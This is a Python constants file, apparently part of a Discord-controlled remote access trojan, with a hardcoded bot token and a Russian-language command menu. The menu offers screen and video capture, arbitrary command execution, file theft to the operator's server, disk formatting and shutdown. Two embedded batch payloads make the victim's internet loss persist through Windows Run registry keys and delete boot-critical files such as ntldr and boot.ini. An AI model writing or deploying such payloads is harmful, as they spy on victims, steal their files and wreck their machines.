token = 'NjkyMDYwNDQ3MzE0MTQ5NDg2.XnpCEA.NnBWH7LLHJKtrTtkfzHwlnOQsTI' #Вставьте токен
channel = 687944069271519257


keys = ['\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
'8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
'browserback', 'browserfavorites', 'browserforward', 'browserhome',
'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
'command', 'option', 'optionleft', 'optionright','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','Q','R',
'S','T','U','V','W','X','Y','Z']

disable_internet = '''
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f" '''


system_kill = '''
echo @off
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini'''

helpmessage = '''
-=**Configuration Administrarion Tool**=-
**/move** (X) (Y) (time) - передвинуть курсор.
**/click** - сделать левый клик мышкой.
**/write** (message) - напечатать что-то.
**/press** (how_many) - нажать клавишу несколько раз.
**/screenshot** - сделать скриншот экрана.
**/cg** - изменить раскладку клавиатуры.
**/help** - выводит это сообщение.
**/processlist** - выводит список процессов.
**/command** - выполнить комманду в терминале.
**/kill** (process) - закрыть принудительно процесс.
**/video** - захват видео.
**/delete** (file) - удалить файл.
**/format** (disk) - отформатировать диск.
**/disable_internet**  - убить интернет соединение (навсегда).
**/copy** (way) - отправляет файл к вам на сервер.
**/system_kill** - удаляет важные файлы для запуска.
**/shutdown** - выключить ПК.
-==== **Made by NullifiedVlad** ====-'''
